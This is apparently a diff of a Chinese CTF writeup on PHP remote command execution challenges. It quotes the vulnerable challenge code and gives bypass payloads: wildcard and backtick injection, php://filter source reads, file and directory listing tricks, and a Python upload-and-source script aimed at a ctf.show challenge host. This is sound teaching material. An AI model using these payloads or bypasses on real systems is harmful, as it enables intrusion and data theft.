@@ -470,21 +470,21 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
-                    2021-05-25
+                    2021-05-27
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    3.8k
+                    6.7k
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    15 分
+                    29 分
                 </div>
                 
 
@@ -514,13 +514,16 @@
 <li><a href="#0x00-%E6%A6%82%E8%BF%B0">0x00 概述</a></li>
 <li><a href="#0x01-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86">0x01 信息收集</a></li>
 <li><a href="#0x02-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C">0x02 命令执行</a><ul>
-<li><a href="#sc-1">SC 1</a></li>
-<li><a href="#sc-2">SC 2</a></li>
-<li><a href="#sc-3">SC 3</a></li>
-<li><a href="#sc-4">SC 4</a></li>
-<li><a href="#sc-5">SC 5</a></li>
-<li><a href="#sc-6">SC 6</a></li>
-<li><a href="#sc-7">SC 7</a></li>
+<li><a href="#rce-1">RCE 1</a></li>
+<li><a href="#rce-2">RCE 2</a></li>
+<li><a href="#rce-3">RCE 3</a></li>
+<li><a href="#rce-4">RCE 4</a></li>
+<li><a href="#rce-5">RCE 5</a></li>
+<li><a href="#rce-6">RCE 6</a></li>
+<li><a href="#rce-7">RCE 7</a></li>
+<li><a href="#rce-8">RCE 8</a></li>
+<li><a href="#rce-9">RCE 9</a></li>
+<li><a href="#rce-10">RCE 10</a></li>
 </ul>
 </li>
 </ul>
@@ -560,7 +563,7 @@
 
 15、数据库外泄指的是数据库文件泄露，比如ACCESS的数据库是.mdb 以及上面提到的 .db 是SQLite的数据库。这两种数据库系统将数据保存在该格式的文件中，而数据库文件又在WEB目录下，攻击者可以下载数据库从而拿到数据。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
-<h1 id="0x02-命令执行"><a href="#0x02-命令执行" class="headerlink" title="0x02 命令执行"></a>0x02 命令执行</h1><h2 id="SC-1"><a href="#SC-1" class="headerlink" title="SC 1"></a>SC 1</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<h1 id="0x02-命令执行"><a href="#0x02-命令执行" class="headerlink" title="0x02 命令执行"></a>0x02 命令执行</h1><h2 id="RCE-1"><a href="#RCE-1" class="headerlink" title="RCE 1"></a>RCE 1</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
     <span class="token variable">$c</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
     <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/flag/i"</span><span class="token punctuation">,</span> <span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
@@ -584,7 +587,7 @@
 也可以进行模糊匹配用&#39;?&#39;代替一些字符
 比如 c&#x3D;system(&#39;cat f??g.php&#39;);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
-<h2 id="SC-2"><a href="#SC-2" class="headerlink" title="SC 2"></a>SC 2</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<h2 id="RCE-2"><a href="#RCE-2" class="headerlink" title="RCE 2"></a>RCE 2</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
     <span class="token variable">$c</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
     <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/flag|system|php/i"</span><span class="token punctuation">,</span> <span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
@@ -605,7 +608,7 @@ pcntl_exec()
 反引号 同shell_exec() <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <p>payload: echo `cat f*`; 或者 echo `cat fl’’ag.php`</p>
-<h2 id="SC-3"><a href="#SC-3" class="headerlink" title="SC 3"></a>SC 3</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<h2 id="RCE-3"><a href="#RCE-3" class="headerlink" title="RCE 3"></a>RCE 3</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
     <span class="token variable">$c</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
     <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/flag|system|php|cat|sort|shell|\.| |\'/i"</span><span class="token punctuation">,</span> <span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
@@ -685,7 +688,7 @@ cookie: PHPSESSID&#x3D;flag.php<span aria-hidden="true" class="line-numbers-rows
 post:a&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flag.php
 
 c&#x3D;?&gt;&lt;?&#x3D;include$_GET[1]?&gt;&amp;1&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flag.php &#x2F;&#x2F;注意进行base64解码<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
-<h2 id="SC-4"><a href="#SC-4" class="headerlink" title="SC 4"></a>SC 4</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+<h2 id="RCE-4"><a href="#RCE-4" class="headerlink" title="RCE 4"></a>RCE 4</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
     <span class="token variable">$c</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
     <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/flag/i"</span><span class="token punctuation">,</span> <span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
         <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
@@ -709,7 +712,7 @@ php5.2.0起，数据流封装器开始有效，主要用于数据流的读取。
 使用Ctrl+F搜索short_open_tag 
 然后将等号后面的Off改成On，再重新启动Apache服务，那么短标签就会被识别了<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
-<h2 id="SC-5"><a href="#SC-5" class="headerlink" title="SC 5"></a>SC 5</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+<h2 id="RCE-5"><a href="#RCE-5" class="headerlink" title="RCE 5"></a>RCE 5</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
     <span class="token variable">$c</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
 <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/[0-9]|[a-z]|\^|\+|\~|\$|\[|\]|\&#123;|\&#125;|\&amp;|\-/i'</span><span class="token punctuation">,</span> <span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
         <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"echo(<span class="token interpolation"><span class="token variable">$c</span></span>);"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
@@ -806,7 +809,7 @@ operations <span class="token operator">=</span> sys<span class="token punctuati
 main<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <p><img src="1.jpg"></p>
-<h2 id="SC-6"><a href="#SC-6" class="headerlink" title="SC 6"></a>SC 6</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+<h2 id="RCE-6"><a href="#RCE-6" class="headerlink" title="RCE 6"></a>RCE 6</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
     <span class="token variable">$c</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
     <span class="token function">system</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token operator">.</span><span class="token string double-quoted-string">" >/dev/null 2>&amp;1"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
@@ -832,7 +835,7 @@ main<span class="token punctuation">(</span><span class="token punctuation">)</s
 <p>payload:</p>
 <pre class="line-numbers language-none"><code class="language-none">?c&#x3D;tac flag.php;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<h2 id="SC-7"><a href="#SC-7" class="headerlink" title="SC 7"></a>SC 7</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+<h2 id="RCE-7"><a href="#RCE-7" class="headerlink" title="RCE 7"></a>RCE 7</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
     <span class="token variable">$c</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
     <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/\;|[a-z]|\`|\%|\x09|\x26|\>|\&lt;/i"</span><span class="token punctuation">,</span> <span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
         <span class="token function">system</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
@@ -858,9 +861,285 @@ main<span class="token punctuation">(</span><span class="token punctuation">)</s
 文件名最后的6个字符是随机的大小写字母，而且最后一个字符大概率是大写字母。
 容易想到的匹配方式就是利用？
 进行匹配，即???&#x2F;?????????，然而这不一定会匹配到我们上传的文件<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+<p>我们查看ASCII表看我们需要的字符。<br><img src="2.jpg"></p>
+<p>在大写字母A的前一个符号为@，大写字母Z的后一个字母为[，因此我们可以使用<code>[@-[]</code>来表示匹配大写字母，也就是变成了这样的形式：<code>???/????????[@-[]</code>，到这一步已经能匹配到了我们上传的文件。</p>
+<p>我们这里写了一个python代码：</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests
 
-
+<span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>
+    url <span class="token operator">=</span> <span class="token string">'http://2dbf5d2f-bfd5-41fe-b436-34c7e21c670c.challenge.ctf.show:8080/?c=. /???/????????[@-[]'</span>
+    req <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> files<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">'file'</span><span class="token punctuation">:</span> <span class="token punctuation">(</span><span class="token string">'Kfzz1.txt'</span><span class="token punctuation">,</span> <span class="token string">'cat flag.php'</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
+    flag <span class="token operator">=</span> req<span class="token punctuation">.</span>text<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">"ctfshow"</span><span class="token punctuation">)</span>
+    <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">1</span><span class="token punctuation">:</span>
+        <span class="token keyword">print</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>text<span class="token punctuation">)</span>
+        <span class="token keyword">break</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p><img src="3.jpg"></p>
 <p>当然在P神的文章中我们可以学习一些通配符的技巧，其实跟正则有点类似，理解起来也不困难。P神不愧是大佬，看他的文章确实很涨“姿势”。</p>
+<h2 id="RCE-8"><a href="#RCE-8" class="headerlink" title="RCE 8"></a>RCE 8</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+        <span class="token variable">$c</span><span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+        <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+<p>这其实是一个非常简单的题，我们可以通过蚁剑或者菜刀直接连上去，当然我们也可以进行命令执行：</p>
+<pre class="line-numbers language-none"><code class="language-none">post:
+c&#x3D; show_source(tac flag.php)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+<p>我们在这里通过这道题统一整理一下文件查看的函数：</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token function">show_source</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token function">print_r</span><span class="token punctuation">(</span><span class="token function">php_strip_whitespace</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token function">print_r</span><span class="token punctuation">(</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token function">readfile</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token function">print_r</span><span class="token punctuation">(</span><span class="token function">file</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// var_dump</span>
+<span class="token function">fread</span><span class="token punctuation">(</span><span class="token function">fopen</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"r"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token variable">$size</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 非php代码</span>
+<span class="token keyword">include_once</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 非php代码</span>
+<span class="token keyword">require</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 非php代码</span>
+<span class="token keyword">require_once</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 非php代码</span>
+<span class="token function">print_r</span><span class="token punctuation">(</span><span class="token function">fread</span><span class="token punctuation">(</span><span class="token function">popen</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"cat flag"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"r"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token variable">$size</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token function">print_r</span><span class="token punctuation">(</span><span class="token function">fgets</span><span class="token punctuation">(</span><span class="token function">fopen</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"r"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 读取一行</span>
+<span class="token function">fpassthru</span><span class="token punctuation">(</span><span class="token function">fopen</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"r"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 从当前位置一直读取到 EOF</span>
+<span class="token function">print_r</span><span class="token punctuation">(</span><span class="token function">fgetcsv</span><span class="token punctuation">(</span><span class="token function">fopen</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"r"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token variable">$size</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token function">print_r</span><span class="token punctuation">(</span><span class="token function">fgetss</span><span class="token punctuation">(</span><span class="token function">fopen</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"r"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 从文件指针中读取一行并过滤掉 HTML 标记</span>
+<span class="token function">print_r</span><span class="token punctuation">(</span><span class="token function">fscanf</span><span class="token punctuation">(</span><span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"flag"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"r"</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"%s"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token function">print_r</span><span class="token punctuation">(</span><span class="token function">parse_ini_file</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 失败时返回 false , 成功返回配置数组</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p><strong>奇技淫巧</strong><br>总结一下<a target="_blank" rel="noopener" href="https://blog.csdn.net/miuzzx/article/details/108619930?spm=1001.2014.3001.5501">羽师傅</a>的绕过技巧</p>
+<p>方法一：</p>
+<pre class="line-numbers language-none"><code class="language-none">通过复制，重命名读取php文件内容（函数执行后，访问url&#x2F;flag.txt）
+函数：
+copy()
+rename()
+用法：
+copy(&quot;flag.php&quot;,&quot;flag.txt&quot;);             
+rename(&quot;flag.php&quot;,&quot;flag.txt&quot;);           <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>方法二：</p>
+<pre class="line-numbers language-none"><code class="language-none">通过fopen读文件内容：
+函数：
+fread()
+fgets()
+fgetc()
+fgetss()
+fgetcsv()
+gpassthru()
+用法：
+$a&#x3D;fopen(&quot;flag.php&quot;,&quot;r&quot;);while (!feof($a)) &#123;$line &#x3D; fgetss($a);echo $line;&#125;       &#x2F;&#x2F;php7.3版本后 该函数已不再被使用
+$a&#x3D;fopen(&quot;flag.php&quot;,&quot;r&quot;);echo fpassthru($a);                                      
+$a&#x3D;fopen(&quot;flag.php&quot;,&quot;r&quot;);echo fread($a,&quot;1000&quot;);                                   
+$a&#x3D;fopen(&quot;flag.php&quot;,&quot;r&quot;);while (!feof($a)) &#123;$line &#x3D; fgets($a);echo $line;&#125;        
+$a&#x3D;fopen(&quot;flag.php&quot;,&quot;r&quot;);while (!feof($a)) &#123;$line &#x3D; fgetc($a);echo $line;&#125;        
+$a&#x3D;fopen(&quot;flag.php&quot;,&quot;r&quot;);while (!feof($a)) &#123;$line &#x3D; fgetcsv($a);print_r($line);&#125;  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>方法三：</p>
+<pre class="line-numbers language-none"><code class="language-none">flag不在flag.php中,需要先查找flag所在的位置
+scandir()
+opendir()  &#x2F;&#x2F; 打开目录句柄。
+readdir()  &#x2F;&#x2F;返回目录中下一个文件的文件名。
+用法
+c&#x3D;var_dump(scandir(&quot;&#x2F;&quot;));highlight_file(&quot;&#x2F;flag.txt&quot;);                                                           
+c&#x3D;$a&#x3D;opendir(&quot;&#x2F;&quot;); while (($file &#x3D; readdir($a)) !&#x3D;&#x3D; false)&#123;echo $file . &quot;&lt;br&gt;&quot;; &#125;;highlight_file(&quot;&#x2F;flag.txt&quot;); &#x2F;&#x2F;首先打开根目录并返回一个目录句柄，然后用readdir函数进行一个个文件名进行读取，如果匹配成功进行高亮处理。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p><strong>知识点：</strong><br>如果遇到读取目录的函数被禁用了，我总结了以下一些方法进行目录读取：</p>
+<pre class="line-numbers language-none"><code class="language-none">glob() 函数返回一个包含匹配指定模式的文件名或目录的数组。
+
+print_r(glob(&quot;*&quot;)); &#x2F;&#x2F; 列当前目录
+print_r(glob(&quot;&#x2F;*&quot;)); &#x2F;&#x2F; 列根目录
+print_r(scandir(&quot;.&quot;));
+print_r(scandir(&quot;&#x2F;&quot;));
+$d&#x3D;opendir(&quot;.&quot;);while(false!&#x3D;&#x3D;($f&#x3D;readdir($d)))&#123;echo&quot;$f\n&quot;;&#125;
+$d&#x3D;dir(&quot;.&quot;);while(false!&#x3D;&#x3D;($f&#x3D;$d-&gt;read()))&#123;echo$f.&quot;\n&quot;;&#125;
+$a&#x3D;glob(&quot;&#x2F;*&quot;);foreach($a as $value)&#123;echo $value.&quot;   &quot;;&#125;
+$a&#x3D;new DirectoryIterator(&#39;glob:&#x2F;&#x2F;&#x2F;*&#39;);foreach($a as $f)&#123;echo($f-&gt;__toString().&quot; &quot;);&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>在日常工作渗透里面除非有disable_functions函数不然用不到这么多，所以我们可以主要记住几个，然后再来查找。</p>
+<h2 id="RCE-9"><a href="#RCE-9" class="headerlink" title="RCE 9"></a>RCE 9</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token function">ini_set</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'display_errors'</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+        <span class="token variable">$c</span><span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+        <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token variable">$s</span> <span class="token operator">=</span> <span class="token function">ob_get_contents</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
